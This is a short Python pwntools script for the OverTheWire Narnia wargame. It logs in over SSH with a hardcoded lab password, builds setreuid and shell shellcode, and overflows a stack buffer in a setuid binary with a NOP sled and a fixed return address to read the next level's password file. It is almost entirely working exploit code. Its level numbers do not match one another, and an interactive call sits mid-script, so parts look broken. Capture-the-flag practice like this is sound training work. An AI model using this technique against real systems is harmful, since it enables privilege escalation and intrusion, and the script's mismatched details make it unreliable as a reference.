#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia6', 
            'narnia.labs.overthewire.org', 
            password='neezocaeng',
            port=2226)

ShellCode = pwn.asm(
            pwn.shellcraft.i386.linux.setreuid(14007) + 
            pwn.shellcraft.i386.linux.sh()
)


n=pwn.cyclic(300)
print(n)
s.interactive()
n=pwn.cyclic_find(0x63616173)
arg=(b'\x90'*n+ShellCode)[-n:]+pwn.p32(0xffffd420+2401)
p = s.process([b'/narnia/narnia4', arg])
p.sendline(b"cat /etc/narnia_pass/narnia5")
print(p.recvline())
s.close()
